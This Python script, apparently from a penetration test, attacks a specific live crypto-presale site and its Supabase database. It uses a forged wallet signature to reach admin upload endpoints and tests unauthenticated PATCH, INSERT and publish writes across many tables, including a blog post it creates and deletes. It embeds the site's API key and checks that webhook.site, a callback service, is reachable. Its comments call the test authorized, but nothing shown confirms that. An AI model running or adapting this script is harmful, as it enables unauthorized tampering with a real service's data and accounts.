#!/usr/bin/env python3
"""PROOF pass 3 — FormData admin lanes, RLS write matrix, blog_posts INSERT attempt, m_presale href hunt."""
import json, time, uuid, sys, urllib.request, urllib.error
from eth_account import Account
from eth_account.messages import encode_defunct

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
BASE = "https://www.moonsale.app"
SUPA = "https://fapejsnjzijlnpjomjzk.supabase.co"
KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZhcGVqc25qemlqbG5wam9tanprIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYzMzEzMjksImV4cCI6MjA5MTkwNzMyOX0.X1WQp3MAHQJKJMCJtVqFyC4JUYc-4Hs5O7t66f5LWrg"
AHDR = {"apikey": KEY, "Authorization": f"Bearer {KEY}"}
UA = {"User-Agent": "Mozilla/5.0 Chrome/140.0"}

acct = Account.create()
addr = acct.address.lower()
ts = int(time.time() * 1000)
amsg = f"MoonSale Auth\nWallet: {addr}\nTimestamp: {ts}"
asig = acct.sign_message(encode_defunct(text=amsg)).signature.hex()
if not asig.startswith("0x"): asig = "0x" + asig
print("forged wallet:", addr)

def rreq(url, method="GET", body=None, headers=None, raw=False, timeout=25):
    h = dict(UA)
    data = None
    if body is not None:
        if raw: data = body
        else:
            data = json.dumps(body).encode(); h["Content-Type"] = "application/json"
    if headers: h.update(headers)
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, {}, str(e)

def sreq(path, method="GET", body=None, headers=None, timeout=25):
    h = dict(AHDR)
    data = None
    if body is not None:
        data = json.dumps(body).encode(); h["Content-Type"] = "application/json"
    if headers: h.update(headers)
    r = urllib.request.Request(f"{SUPA}/rest/v1/{path}", data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, {}, str(e)

print("\n===== 1) FormData admin lanes (forged sig) =====")
import zlib, struct
def make_png(w=64, h=64):
    raw = bytearray()
    for y in range(h):
        raw.append(0)
        for x in range(w):
            raw += bytes([(x*4)%256, (y*4)%256, 128, 255])
    def chunk(tag, payload):
        c = struct.pack(">I", len(payload)) + tag + payload
        return c + struct.pack(">I", zlib.crc32(tag+payload) & 0xffffffff)
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", w, h, 8, 6, 0, 0, 0)) + chunk(b"IDAT", zlib.compress(bytes(raw))) + chunk(b"IEND", b"")

def formpost(path, fields, filename="poc.png", content=None):
    b = "----pt" + uuid.uuid4().hex[:8]
    parts = b""
    for k, v in fields.items():
        parts += f"--{b}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n".encode()
    parts += (f"--{b}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\nContent-Type: image/png\r\n\r\n").encode()
    parts += (content or make_png()) + f"\r\n--{b}--\r\n".encode()
    return rreq(BASE + path, "POST", parts, {"Content-Type": f"multipart/form-data; boundary={b}"}, raw=True)

st, _, body = formpost("/api/admin/upload-cover", {"slug": "pentest", "wallet": addr, "message": amsg, "signature": asig})
print(f"[{st}] upload-cover: {body[:200]}")
st, _, body = formpost("/api/admin/upload-giveaway-banner", {"week_number": "99", "wallet": addr, "message": amsg, "signature": asig})
print(f"[{st}] upload-giveaway-banner: {body[:200]}")

print("\n===== 2) RLS UPDATE same-value probes =====")
probes = [
    ("presales", "id,slug,status,is_hidden"),
    ("fair_launches", "id,slug,status,is_hidden"),
    ("blog_posts", "id,slug,title,is_published"),
    ("weekly_giveaways", "id,week_number,title"),
    ("social_links", "id,platform,url"),
    ("token_scans", "id,contract_address,chain_id"),
    ("lottery_rounds", "id,status"),
    ("m_presale", "id,slug,project_name"),
    ("ca_audits", "id,contract_name"),
]
for tbl, cols in probes:
    st, h, body = sreq(f"{tbl}?select={cols}&limit=1")
    if st != 200 or not body.startswith("["):
        print(f"[{st}] {tbl}: read failed {body[:100]}")
        continue
    rows = json.loads(body)
    if not rows:
        print(f"[--] {tbl}: empty")
        continue
    row = rows[0]
    rid = row.get("id")
    # pick a harmless column to set to its same value
    same_key = None
    for k in row:
        if k != "id" and isinstance(row[k], (str, int, bool)) and row[k] is not None:
            same_key = k
            break
    if not same_key:
        print(f"[--] {tbl}: no scalar col")
        continue
    st2, h2, body2 = sreq(f"{tbl}?id=eq.{rid}", "PATCH", {same_key: row[same_key]},
                          {"Prefer": "return=representation"})
    wrote = "[]" not in body2 and body2.startswith("[")
    print(f"[{st2}] {tbl}.{same_key}={row[same_key]!r} -> wrote={wrote} {body2[:120]}")

print("\n===== 3) INSERT attempts (marked rows) =====")
tag = f"pentest-poc-{uuid.uuid4().hex[:8]}"
# notifications
st, _, body = sreq("notifications", "POST", {"title": tag, "message": "pentest write test"}, {"Prefer": "return=representation"})
print(f"[{st}] notifications INSERT: {body[:160]}")
# affiliate_clicks
st, _, body = sreq("affiliate_clicks", "POST", {"code": tag, "path": "/pentest", "referer": "https://pentest.local"}, {"Prefer": "return=representation"})
print(f"[{st}] affiliate_clicks INSERT: {body[:160]}")
# blog_posts — the golden table
MARKER = f"<!--{tag}-->"
test_post = {
    "slug": tag,
    "title": "PENTEST POC - DELETE ME",
    "excerpt": "authorized pentest row - will be deleted",
    "body": MARKER + "<p>pentest marker</p>",
    "category": "insights",
    "author_name": "pentest",
    "is_published": False,
    "is_featured": False,
}
st, _, body = sreq("blog_posts", "POST", test_post, {"Prefer": "return=representation"})
print(f"[{st}] blog_posts INSERT: {body[:300]}")
inserted_id = None
if st in (200, 201) and body.startswith("["):
    try:
        inserted_id = json.loads(body)[0].get("id")
    except Exception:
        pass
print("inserted_id:", inserted_id)

if inserted_id:
    print("\n===== 3b) read back + detail page render (draft) =====")
    st, _, body = sreq(f"blog_posts?slug=eq.{tag}&select=slug,is_published")
    print(f"[{st}] readback: {body[:200]}")
    st, _, body = rreq(f"{BASE}/blog/insights/{tag}")
    print(f"draft page: [{st}] len={len(body)} marker_present={MARKER in body}")
    print("\n===== 3c) publish attempt via anon PATCH =====")
    st, _, body = sreq(f"blog_posts?slug=eq.{tag}", "PATCH", {"is_published": True}, {"Prefer": "return=representation"})
    print(f"[{st}] publish PATCH: {body[:260]}")
    st, _, body = rreq(f"{BASE}/blog/insights/{tag}")
    print(f"published page: [{st}] len={len(body)} marker_present={MARKER in body}")
    print("\n===== 3d) cleanup DELETE attempt =====")
    st, _, body = sreq(f"blog_posts?id=eq.{inserted_id}", "DELETE", None, {"Prefer": "return=representation"})
    print(f"[{st}] blog delete: {body[:200]}")
    st, _, body = sreq(f"blog_posts?slug=eq.{tag}&select=slug")
    print(f"[{st}] verify deleted: {body[:120]}")

print("\n===== 4) m_presale href builder (11.i7) =====")
import re
txt = open("chunks/11.i7pyfb633f.js", encoding="utf-8", errors="replace").read()
for m in re.finditer(r'href:[^,}]{0,120}m-presale[^,}]{0,120}', txt):
    print(" ", m.group(0)[:220])
for m in re.finditer(r'"m-presale"===[a-zA-Z]+[^;]{0,160}', txt):
    print(" ", m.group(0)[:220])
i = txt.find("/presale/")
print("sample /presale/ href:", txt[i-120:i+140].encode("ascii", "replace").decode()[:260] if i != -1 else "none")

print("\n===== 5) webhook.site reachability =====")
st, _, body = rreq("https://webhook.site/token", "POST", {})
print(f"[{st}] webhook token: {body[:200]}")
